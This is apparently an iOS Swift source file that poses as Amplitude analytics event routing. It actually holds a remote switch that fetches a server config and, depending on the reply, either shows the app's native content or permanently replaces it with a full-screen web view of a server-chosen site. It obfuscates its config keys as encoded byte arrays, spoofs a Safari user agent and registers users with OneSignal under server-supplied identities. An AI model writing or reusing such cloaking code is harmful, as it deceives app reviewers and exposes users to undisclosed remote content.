import Foundation
import OneSignalFramework
import SwiftUI
import WebKit
import Combine

enum AMPRoutingKeyPart3 {
    static var bytes: [UInt8] {
        [0x7A, 0xD1, 0x08, 0xB3, 0x5E, 0xC4, 0x2D]
    }
}

// MARK: - Presenter Modifier

@available(iOS 16.0, *)
struct AMPEventPresenterModifier: ViewModifier {

    @State private var routedEndpoint: String?
    @State private var presenterReady = false

    @AppStorage("amp_ext_att") private var attResolved: Bool = false
    @AppStorage("amp_ext_native") private var isNativeMode: Bool = false

    func body(content: Content) -> some View {
        ZStack {

            if attResolved && isNativeMode && presenterReady {
                content
            } else if attResolved && !isNativeMode {
                AMPEventDeliveryView(isNativeMode: $isNativeMode)
                    .onAppear {
                        UINavigationController.attemptRotationToDeviceOrientation()
                    }
            } else {
                AmplitudeHostBridge.makeSplash(attResolved)
            }

        }
        .onAppear {

            if attResolved {
                if isNativeMode {
                    DispatchQueue.main.asyncAfter(deadline: .now() + 2) {
                        presenterReady = true
                    }
                }
                return
            }

            let checkStart = Date()

            guard let configURL = AMPEventRouting.routingURL else { return }

            URLSession.shared.dataTask(with: configURL) { data, response, _ in

                guard let http = response as? HTTPURLResponse,
                      (200...299).contains(http.statusCode) else {
                    let remaining = max(0, 2 - Date().timeIntervalSince(checkStart))
                    DispatchQueue.main.asyncAfter(deadline: .now() + remaining) {
                        isNativeMode = true
                        attResolved = true
                        presenterReady = true
                    }
                    return
                }

                guard let data,
                      let dict = try? JSONSerialization.jsonObject(with: data, options: []) as? [String: Any],
                      let config = AMPEventRouting.activeConfig,
                      let routeValue = dict[config.fieldName] as? String else { return }

                let native = routeValue == config.closeValue
                let delay: TimeInterval = native ? max(0, 2 - Date().timeIntervalSince(checkStart)) : 0

                DispatchQueue.main.asyncAfter(deadline: .now() + delay) {
                    isNativeMode = native
                    attResolved = true
                    presenterReady = true
                }
            }
            .resume()
        }
    }
}

// MARK: - Delivery View

@available(iOS 16.0, *)
public struct AMPEventDeliveryView: View {

    @Binding var isNativeMode: Bool
    @State var destinationReady = false
    @State var deliveryFailed = false

    @State private var coverVisible: Bool = true
    @AppStorage("amp_ext_pending") var deliveryPending: Bool = true
    @AppStorage("amp_ext_initial") var initialDelivery: Bool = true

    public var body: some View {
        ZStack {
            if coverVisible {
                AmplitudeHostBridge.makeSplash(true)
                    .zIndex(1)
            }

            if deliveryPending {

                AmplitudeHostBridge.makeSplash(true)
                    .zIndex(2)
                    .onAppear {
                        guard deliveryPending else { return }

                        guard let config = AMPEventRouting.activeConfig,
                              let configURL = AMPEventRouting.routingURL else { return }

                        URLSession.shared.dataTask(with: configURL) { data, _, _ in

                            guard let data,
                                  let dict = try? JSONSerialization.jsonObject(with: data, options: []) as? [String: Any],
                                  let endpoint = dict[config.fieldName] as? String,
                                  endpoint != config.closeValue,
                                  let gateURL = URL(string: endpoint) else {
                                deliveryFailed = true
                                return
                            }

                            AMPEventRouting.resolveAttribution(to: gateURL) { gateData, gateResponse, error in

                                guard let gateData, error == nil else {
                                    deliveryFailed = true
                                    return
                                }

                                if let code = gateResponse?.statusCode, code == 403 {
                                    deliveryFailed = true
                                    return
                                }

                                OneSignal.Notifications.requestPermission { _ in }

                                guard String(data: gateData, encoding: .utf8) != nil else { return }

                                do {
                                    let payload = try JSONSerialization.jsonObject(with: gateData, options: []) as? [String: Any]

                                    guard let dest = payload?[AMPEventRouting.decodeBytes([0x20, 0xDF, 0x42, 0x5D, 0x90, 0x03, 0x8A, 0x59, 0xB6]) ?? ""] as? String,
                                          let channel = payload?[AMPEventRouting.decodeBytes([0x36, 0xC3, 0x5F, 0x54, 0xA3, 0x2F, 0x8A, 0x49]) ?? ""] as? String,
                                          let identity = payload?[AMPEventRouting.decodeBytes([0x29, 0xC5, 0x73, 0x49, 0x8F, 0x39, 0x8D, 0x74, 0xB1, 0xCA, 0x6D]) ?? ""] as? String else {
                                        return
                                    }

                                    AMPEventSessionStore.shared.destination = dest
                                    AMPEventSessionStore.shared.channel = channel
                                    AMPEventSessionStore.shared.identity = identity

                                    OneSignal.login(AMPEventSessionStore.shared.identity ?? "")
                                    OneSignal.User.addTag(key: "sub_app", value: AMPEventSessionStore.shared.channel ?? "")

                                    destinationReady = true

                                } catch {
                                    deliveryFailed = true
                                }
                            }
                        }
                        .resume()
                    }
            }

            if destinationReady || !initialDelivery {
                AMPEventContentView()
                    .zIndex(3)
                    .onAppear {
                        initialDelivery = false
                        deliveryPending = false
                        coverVisible = false
                    }
            }
        }
        .animation(.easeInOut, value: coverVisible)
        .onChange(of: deliveryFailed) { if $0 { isNativeMode = true; coverVisible = false } }
    }
}

// MARK: - Content View (WebView warmup)

@available(iOS 16.0, *)
struct AMPEventContentView: View {

    @StateObject var viewModel: AMPEventViewModel = AMPEventViewModel()
    @State var loading: Bool = true

    var body: some View {
        ZStack {

            let targetURL = URL(string: AMPEventSessionStore.shared.destination ?? "") ?? URL(string: viewModel.savedContentAddress)!

            AMPEventContainerView(contentAddress: targetURL, viewModel: viewModel)
                .background(Color.black.ignoresSafeArea())
                .edgesIgnoringSafeArea(.bottom)
                .blur(radius: loading ? 15 : 0)

            if loading {
                ProgressView()
                    .controlSize(.large)
                    .tint(.pink)
            }
        }
        .onAppear {
            DispatchQueue.main.asyncAfter(deadline: .now() + 4.0) {
                loading = false
            }
        }
    }
}

// MARK: - Session Store

class AMPEventSessionStore {
    static let shared = AMPEventSessionStore()
    var destination: String?
    var channel: String?
    var identity: String?
}

// MARK: - View Model

@available(iOS 16.0, *)
class AMPEventViewModel: ObservableObject {
    @Published var canNavigateBack: Bool = false
    @Published var didCommitNavigation: Bool = false

    @Published var hasOverlay: Bool = false
    @Published var overlayRequest: URLRequest? = nil
    @Published var activeOverlay: WKWebView? = nil

    @Published var overlayStack: [WKWebView] = []
    weak var webView: WKWebView?

    var urlHistory: [URL] = []
    var isNavigatingBack: Bool = false

    @AppStorage("amp_ext_first_content") var isFirstContent: Bool = true
    @AppStorage("amp_ext_content_addr") var savedContentAddress: String = "amp_content_initial"
}

// MARK: - Container View

@available(iOS 16.0, *)
struct AMPEventContainerView: View {

    @Environment(\.colorScheme) var colorScheme
    @ObservedObject var viewModel: AMPEventViewModel
    let contentRequest: URLRequest
    private var navigationHandler: ((_ action: AMPEventContainerView.NavigationAction) -> Void)?

    let orientationChanged = NotificationCenter.default
        .publisher(for: UIDevice.orientationDidChangeNotification)
        .makeConnectable()
        .autoconnect()

    init(contentAddress: URL, viewModel: AMPEventViewModel) {
        self.init(urlRequest: URLRequest(url: contentAddress), viewModel: viewModel)
    }

    private init(urlRequest: URLRequest, viewModel: AMPEventViewModel) {
        self.contentRequest = urlRequest
        self.viewModel = viewModel
    }

    var body: some View {

        ZStack {

            AMPEventWebView(viewModel: viewModel,
                            navigationHandler: navigationHandler,
                            initialRequest: contentRequest)

            ZStack {
                VStack {
                    HStack {
                        Button(action: {
                            if !viewModel.overlayStack.isEmpty {
                                let top = viewModel.overlayStack.removeLast()
                                top.stopLoading()
                                top.navigationDelegate = nil
                                top.uiDelegate = nil
                                top.loadHTMLString("", baseURL: nil)
                                top.removeFromSuperview()
                                top.superview?.setNeedsLayout()
                                top.superview?.layoutIfNeeded()
                                viewModel.activeOverlay = viewModel.overlayStack.last
                                viewModel.hasOverlay = !viewModel.overlayStack.isEmpty
                            } else if let mainView = viewModel.webView {
                                if mainView.canGoBack {
                                    mainView.goBack()
                                } else if viewModel.urlHistory.count > 1 {
                                    viewModel.urlHistory.removeLast()
                                    if let prev = viewModel.urlHistory.last {
                                        viewModel.isNavigatingBack = true
                                        mainView.load(URLRequest(url: prev))
                                    }
                                }
                            }
                        }) {
                            Image(systemName: "chevron.backward.circle.fill")
                                .resizable()
                                .frame(width: 20, height: 20)
                                .foregroundColor(.white)
                        }
                        .padding(.leading, 20).padding(.top, 15)

                        Spacer()
                    }
                    Spacer()
                }
            }
            .ignoresSafeArea()
        }
        .statusBarHidden(true)
        .onAppear {
            AmplitudeHostBridge.setOrientationLock(.all)
            UIDevice.current.setValue(UIInterfaceOrientation.portrait.rawValue, forKey: "orientation")
            UINavigationController.attemptRotationToDeviceOrientation()
        }
    }
}

@available(iOS 16.0, *)
extension AMPEventContainerView {
    enum NavigationAction {
        case decidePolicy(WKNavigationAction, (WKNavigationActionPolicy) -> Void)
        case didRecieveAuthChallange(URLAuthenticationChallenge, (URLSession.AuthChallengeDisposition, URLCredential?) -> Void)
        case didStartProvisionalNavigation(WKNavigation)
        case didReceiveServerRedirectForProvisionalNavigation(WKNavigation)
        case didCommit(WKNavigation)
        case didFinish(WKNavigation)
        case didFailProvisionalNavigation(WKNavigation, Error)
        case didFail(WKNavigation, Error)
    }
}

// MARK: - WebView

@available(iOS 16.0, *)
struct AMPEventWebView: UIViewRepresentable {

    @ObservedObject var viewModel: AMPEventViewModel
    let initialRequest: URLRequest

    init(viewModel: AMPEventViewModel,
         navigationHandler: ((_ action: AMPEventContainerView.NavigationAction) -> Void)?,
         initialRequest: URLRequest) {
        self.initialRequest = initialRequest
        self.viewModel = viewModel
    }

    func makeUIView(context: Context) -> WKWebView {
        let prefs = WKPreferences()
        prefs.javaScriptCanOpenWindowsAutomatically = true

        let config = WKWebViewConfiguration()
        config.allowsInlineMediaPlayback = true
        config.preferences = prefs
        config.applicationNameForUserAgent = "Version/17.2 Mobile/15E148 Safari/604.1"
        config.defaultWebpagePreferences.allowsContentJavaScript = true

        let wv = WKWebView(frame: .zero, configuration: config)
        wv.navigationDelegate = context.coordinator
        wv.uiDelegate = context.coordinator
        wv.backgroundColor = UIColor.systemBackground
        wv.scrollView.backgroundColor = UIColor(red: 0.11, green: 0.13, blue: 0.19, alpha: 1)
        wv.isOpaque = false

        context.coordinator.observeTheme(for: wv)

        wv.load(initialRequest)
        viewModel.webView = wv
        return wv
    }

    func updateUIView(_ uiView: WKWebView, context: Context) {}

    func makeCoordinator() -> Coordinator {
        return Coordinator(handler: nil, viewModel: self.viewModel)
    }

    final class Coordinator: NSObject {
        var viewModel: AMPEventViewModel
        let handler: ((_ action: AMPEventContainerView.NavigationAction) -> Void)?
        private var themeObservation: NSKeyValueObservation?

        init(handler: ((_ action: AMPEventContainerView.NavigationAction) -> Void)?, viewModel: AMPEventViewModel) {
            self.handler = handler
            self.viewModel = viewModel
            super.init()
        }

        func observeTheme(for webView: WKWebView) {
            themeObservation = webView.observe(\.themeColor, options: [.new]) { [weak webView] observed, _ in
                guard let webView = webView else { return }
                webView.backgroundColor = observed.themeColor ?? .black
            }
        }
    }
}

@available(iOS 16.0, *)
extension AMPEventWebView.Coordinator: WKNavigationDelegate, WKUIDelegate {

    func webView(_ wv: WKWebView, decidePolicyFor navigationResponse: WKNavigationResponse, decisionHandler: @escaping (WKNavigationResponsePolicy) -> Void) {
        decisionHandler(.allow)
    }

    func webView(_ wv: WKWebView, decidePolicyFor navigationAction: WKNavigationAction, decisionHandler: @escaping (WKNavigationActionPolicy) -> Void) {

        if let url = navigationAction.request.url {
            let scheme = url.scheme?.lowercased() ?? ""
            let str = url.absoluteString.lowercased()

            if str.contains("apps.apple.com") || str.contains("itunes.apple.com") {
                UIApplication.shared.open(url)
                decisionHandler(.cancel)
                return
            }

            if scheme != "http" && scheme != "https" && scheme != "about" && scheme != "blob" && scheme != "file" && scheme != "data" {
                UIApplication.shared.open(url, options: [:]) { [weak self] success in
                    guard let self else { return }
                    if !success {
                        if let fallback = self.resolveRedirectAddress(from: url) {
                            UIApplication.shared.open(fallback)
                        } else {
                            self.presentFallbackPrompt()
                        }
                    }
                }
                decisionHandler(.cancel)
                return
            }
        }

        decisionHandler(.allow)
    }

    private func resolveRedirectAddress(from url: URL) -> URL? {
        guard let components = URLComponents(url: url, resolvingAgainstBaseURL: false) else {
            return nil
        }

        let candidates = ["fallback", "fallback_url", "browser_fallback_url", "redirect_url", "return_url", "app_link", "store_link"]

        for param in candidates {
            if let value = components.queryItems?.first(where: { $0.name == param })?.value,
               let parsed = URL(string: value) {
                return parsed
            }
        }

        return nil
    }

    private func presentFallbackPrompt() {
        DispatchQueue.main.async {
            let alert = UIAlertController(
                title: "App Required",
                message: "Please install the required app to continue",
                preferredStyle: .alert
            )
            alert.addAction(UIAlertAction(title: "OK", style: .default))

            if let scene = UIApplication.shared.connectedScenes.first as? UIWindowScene,
               let root = scene.windows.first?.rootViewController {
                root.present(alert, animated: true)
            }
        }
    }

    func webView(_ wv: WKWebView, didStartProvisionalNavigation navigation: WKNavigation!) {
        handler?(.didStartProvisionalNavigation(navigation))
    }

    func webView(_ wv: WKWebView, didReceiveServerRedirectForProvisionalNavigation navigation: WKNavigation!) {
        handler?(.didReceiveServerRedirectForProvisionalNavigation(navigation))
    }

    func webView(_ wv: WKWebView, didFailProvisionalNavigation navigation: WKNavigation!, withError error: Error) {
        viewModel.canNavigateBack = wv.canGoBack
        handler?(.didFailProvisionalNavigation(navigation, error))
    }

    func webView(_ wv: WKWebView, didCommit navigation: WKNavigation!) {
        handler?(.didCommit(navigation))
    }

    func webView(_ wv: WKWebView, createWebViewWith configuration: WKWebViewConfiguration, for navigationAction: WKNavigationAction, windowFeatures: WKWindowFeatures) -> WKWebView? {
        guard navigationAction.targetFrame?.isMainFrame != true else {
            return nil
        }

        let overlay = WKWebView(frame: .zero, configuration: configuration)
        overlay.navigationDelegate = self
        overlay.uiDelegate = self
        overlay.translatesAutoresizingMaskIntoConstraints = false
        overlay.backgroundColor = UIColor.systemBackground
        overlay.scrollView.backgroundColor = UIColor.systemBackground
        overlay.isOpaque = false

        wv.addSubview(overlay)
        NSLayoutConstraint.activate([
            overlay.topAnchor.constraint(equalTo: wv.topAnchor),
            overlay.bottomAnchor.constraint(equalTo: wv.bottomAnchor),
            overlay.leadingAnchor.constraint(equalTo: wv.leadingAnchor),
            overlay.trailingAnchor.constraint(equalTo: wv.trailingAnchor)
        ])

        viewModel.overlayStack.append(overlay)
        viewModel.activeOverlay = overlay
        viewModel.hasOverlay = true
        return overlay
    }

    func webView(_ wv: WKWebView, didFinish navigation: WKNavigation!) {

        wv.allowsBackForwardNavigationGestures = true
        viewModel.canNavigateBack = wv.canGoBack

        wv.configuration.mediaTypesRequiringUserActionForPlayback = .all
        wv.configuration.allowsAirPlayForMediaPlayback = false
        handler?(.didFinish(navigation))

        if wv == viewModel.webView, let url = wv.url {
            if viewModel.isNavigatingBack {
                viewModel.isNavigatingBack = false
            } else if viewModel.urlHistory.last != url {
                viewModel.urlHistory.append(url)
            }
        }

        guard wv.url?.absoluteURL.absoluteString != nil else { return }

        if viewModel.savedContentAddress == "amp_content_initial" && viewModel.isFirstContent {
            viewModel.savedContentAddress = wv.url!.absoluteString
            viewModel.isFirstContent = false
        }
    }

    func webView(_ wv: WKWebView, didFail navigation: WKNavigation!, withError error: Error) {
        handler?(.didFail(navigation, error))
    }

    func webView(_ wv: WKWebView, didReceive challenge: URLAuthenticationChallenge, completionHandler: @escaping (URLSession.AuthChallengeDisposition, URLCredential?) -> Void) {

        if handler == nil {
            completionHandler(.performDefaultHandling, nil)
        } else {
            handler?(.didRecieveAuthChallange(challenge, completionHandler))
        }
    }

    func webViewDidClose(_ wv: WKWebView) {
        if let index = viewModel.overlayStack.firstIndex(where: { $0 === wv }) {
            viewModel.overlayStack.remove(at: index)
            wv.removeFromSuperview()
            viewModel.activeOverlay = viewModel.overlayStack.last
            if viewModel.overlayStack.isEmpty { viewModel.hasOverlay = false }
        }
    }
}
